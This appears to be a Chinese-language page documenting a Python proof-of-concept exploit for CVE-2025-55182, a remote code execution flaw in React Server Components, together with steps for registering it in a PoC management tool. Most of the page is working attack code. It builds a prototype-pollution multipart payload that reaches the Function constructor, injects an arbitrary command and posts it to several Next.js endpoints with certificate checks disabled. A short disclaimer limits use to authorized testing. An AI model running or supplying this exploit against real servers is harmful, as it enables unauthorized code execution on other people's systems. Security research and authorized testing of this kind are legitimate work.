# CVE-2025-55182 PoC 範例

這是一個針對 CVE-2025-55182（React Server Components RCE）的 PoC 範例，可以在 PoC 管理頁面中使用。

## PoC 資訊

- **名稱**: CVE-2025-55182 - React Server Components RCE
- **類型**: RSC
- **語言**: Python
- **描述**: 針對 React Server Functions 的遠程代碼執行漏洞，影響 Next.js 等使用 React Server Components 的應用

## 腳本內容

```python
#!/usr/bin/env python3
"""
CVE-2025-55182 PoC - React Server Components RCE
Reference: https://github.com/msanft/CVE-2025-55182

This vulnerability allows RCE in React Server Functions through insecure prototype references.
"""

import json
import requests
import sys
from urllib.parse import urljoin

def create_payload(command):
    """
    Create the RCE payload for CVE-2025-55182
    """
    crafted_chunk = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": json.dumps({"then": "$B0"}),
        "_response": {
            "_prefix": f"{command}",
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    }
    
    files = {
        "0": (None, json.dumps(crafted_chunk)),
        "1": (None, '"$@0"'),
    }
    
    return files

def exploit(target_url, command="whoami"):
    """
    Exploit CVE-2025-55182 on target URL
    """
    try:
        # Normalize URL
        if not target_url.startswith(('http://', 'https://')):
            target_url = f"https://{target_url}"
        
        # Remove trailing slash
        target_url = target_url.rstrip('/')
        
        # Try common Next.js action endpoints
        endpoints = [
            f"{target_url}/",
            f"{target_url}/api",
            f"{target_url}/_next/static",
        ]
        
        payload = create_payload(command)
        
        headers = {
            "Next-Action": "foo",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary",
        }
        
        for endpoint in endpoints:
            try:
                response = requests.post(
                    endpoint,
                    files=payload,
                    headers=headers,
                    timeout=10,
                    verify=False,
                    allow_redirects=True
                )
                
                if response.status_code in [200, 500]:
                    # Check if we got a response that indicates execution
                    if "SyntaxError" in response.text or "function" in response.text.lower():
                        return {
                            "vulnerable": True,
                            "status_code": response.status_code,
                            "tested_url": endpoint,
                            "final_url": response.url,
                            "response_preview": response.text[:200],
                        }
            except requests.exceptions.RequestException as e:
                continue
        
        return {
            "vulnerable": False,
            "status_code": None,
            "tested_url": target_url,
            "error": "No vulnerable endpoint found",
        }
        
    except Exception as e:
        return {
            "vulnerable": None,
            "status_code": None,
            "tested_url": target_url,
            "error": str(e),
        }

def main():
    """
    Main function - can be called from API wrapper
    """
    if len(sys.argv) < 2:
        print(json.dumps({"error": "Usage: python poc.py <target_url> [command]"}))
        sys.exit(1)
    
    target_url = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "whoami"
    
    result = exploit(target_url, command)
    print(json.dumps(result, indent=2))

if __name__ == "__main__":
    main()
```

## 使用說明

### 在 PoC 管理頁面中新增：

1. **名稱**: `CVE-2025-55182 - React Server Components RCE`
2. **描述**: `針對 React Server Functions 的遠程代碼執行漏洞，影響 Next.js 等使用 React Server Components 的應用。參考：https://github.com/msanft/CVE-2025-55182`
3. **類型**: 選擇 `RSC`
4. **語言**: 選擇 `Python`
5. **腳本**: 將上面的 Python 代碼複製貼上
6. **啟用**: 勾選 ✓

### 注意事項

- 此 PoC 僅供安全研究和授權測試使用
- 請確保在合法授權的環境下使用
- 實際的漏洞利用可能需要根據目標環境進行調整
- 建議使用安全檢查模式（safe_check）進行測試

## 參考資料

- [CVE-2025-55182 GitHub Repository](https://github.com/msanft/CVE-2025-55182)
- [React Server Functions Documentation](https://react.dev/reference/rsc/server-functions)
- [React Flight Protocol](https://tonyalicea.dev/blog/understanding-react-server-components/)

